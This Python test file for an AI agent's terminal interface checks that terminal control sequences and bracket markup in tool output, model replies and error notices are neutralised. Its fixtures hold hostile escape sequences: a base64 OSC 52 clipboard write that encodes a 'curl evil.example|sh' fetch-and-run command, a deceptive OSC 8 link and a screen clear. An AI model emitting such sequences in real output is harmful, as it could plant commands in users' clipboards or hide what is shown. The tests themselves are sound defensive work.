"""What a task recorded reaches the screen as plain text: terminal control
sequences in a tool's output, its running output, the model's reply or an
approval's command never reach the terminal, and brackets in a provider's
error or a plugin's notice are shown as written, not read as markup (which
ended the app, on every reopening of the task too)."""

from __future__ import annotations

import asyncio
from pathlib import Path
from typing import Any

from noeta.backends.stores.sqlite import SqliteStore
from noeta.core.agent import Agent
from noeta.core.errors import Transient
from noeta.core.extension import Extension, TaskView
from noeta.core.tool import ToolContext, ToolOutput, text_output
from noeta.core.types import ToolUse
from noeta.host.local import LocalApp
from noeta.testing import ScriptedProvider, reply
from noeta_tui import render
from noeta_tui.app import NoetaApp
from noeta_tui.widgets import ApprovalCard, Notice

from support import MODEL, AskBash, make_app, plain, ready, settle, shown, type_line

OSC52 = "\x1b]52;c;Y3VybCBldmlsLmV4YW1wbGV8c2g=\x07"  # writes the clipboard
OSC8 = "\x1b]8;;https://evil.example\x1b\\docs\x1b]8;;\x1b\\"  # a link
CLEAR = "\x1b[2J\x1b[H"
README = f"# Project{OSC52}\nSee {OSC8} here{CLEAR}\n\x9b31mred"


def test_clean_keeps_the_text_and_drops_every_control_sequence() -> None:
    assert render.clean(README) == "# Project\nSee docs here\n31mred"
    assert render.clean("a\tb\r\nc\x00\x7f\x1bc") == "a\tb\nc"
    assert render.plain("[/x] [b]y[/b]").plain == "[/x] [b]y[/b]"


class Cat:
    """A shell-like tool printing an untrusted file, also while it runs."""

    name = "Bash"
    description = "Run."
    input_schema = {"type": "object"}
    read_only = False
    clearable = False

    def __init__(self) -> None:
        self.release = asyncio.Event()
        self.progressed = asyncio.Event()

    async def run(self, input: dict[str, Any], ctx: ToolContext) -> ToolOutput:
        if ctx.progress is not None:
            ctx.progress(README)
        self.progressed.set()
        await self.release.wait()
        return text_output(README)


def _terminal(app: Any) -> str:
    """What the screen writes to the terminal."""
    return "".join(s.render(app.console) for s in app.screen._compositor.render_strips())


def _escapes(out: str) -> bool:
    return any(seq in out for seq in ("\x1b]52;", "\x1b]8;;https://evil", "\x1b[2J", "\x9b"))


async def test_control_sequences_never_reach_the_terminal(tmp_path: Path) -> None:
    tool = Cat()
    command = f"cat README.md{CLEAR}"
    provider = ScriptedProvider([reply(f"Reading{OSC52}", ("Bash", {"command": command})),
                                 reply(f"It says {OSC8}{CLEAR}")])
    app = make_app(tmp_path, provider, AskBash(), tools=[tool])
    async with app.run_test(size=(120, 40)) as pilot:
        await settle(pilot, lambda: ready(app))
        await type_line(pilot, "read the readme")
        await settle(pilot, lambda: len(app.query(ApprovalCard)) == 1)
        await pilot.pause(0.1)
        assert not _escapes(_terminal(app)) and "cat README.md" in shown(app)
        await pilot.press("y")
        await settle(pilot, lambda: tool.progressed.is_set())
        await pilot.pause(0.2)
        assert not _escapes(_terminal(app))
        tool.release.set()
        await settle(pilot, lambda: not app.busy)
        await pilot.pause(0.2)
        out = _terminal(app)
        assert not _escapes(out) and "Project" in out and "It says docs" in shown(app)


class FailingHook(Extension):
    """Records what the hooks plugin does for a failing hook: its stderr."""

    name = "fakehooks"

    async def after_tool(self, view: TaskView, call: ToolUse, result: Any) -> Any:
        view.notify("PostToolUse hook failed: npm ERR! path [/home/u/proj] [b]lint")
        return result


def _app(tmp_path: Path, provider: Any, **kw: Any) -> NoetaApp:
    tool = Cat()
    tool.release.set()
    agent = Agent(name="main", model=MODEL, tools=[tool], extensions=[FailingHook()])
    local = LocalApp(SqliteStore(str(tmp_path / "t.db")), [agent], provider,
                     env_for=lambda _s: None, sleep=_no_sleep)
    return NoetaApp(local, agent="main", model=MODEL, cwd=str(tmp_path), **kw)


async def test_brackets_in_recorded_text_are_shown_as_written(tmp_path: Path) -> None:
    provider = ScriptedProvider([Transient("500 Internal Server Error [/v1/messages]"),
                                 reply("", ("Bash", {"command": "ls"})), reply("done")])
    app = _app(tmp_path, provider)
    async with app.run_test(size=(110, 30)) as pilot:
        await type_line(pilot, "run")
        await settle(pilot, lambda: len(provider.requests) == 3 and not app.busy)
        notices = [plain(n) for n in app.query(Notice)]
        assert any("[/v1/messages]" in n for n in notices)
        assert any("[/home/u/proj] [b]lint" in n for n in notices)
        task_id = app.task_id
    again = _app(tmp_path, ScriptedProvider([]), resume=task_id)
    async with again.run_test(size=(110, 30)) as pilot:  # the notice is in the log
        await settle(pilot, lambda: "[/home/u/proj]" in shown(again))
    assert again.return_code in (None, 0)


async def _no_sleep(_: float) -> None:
    return None
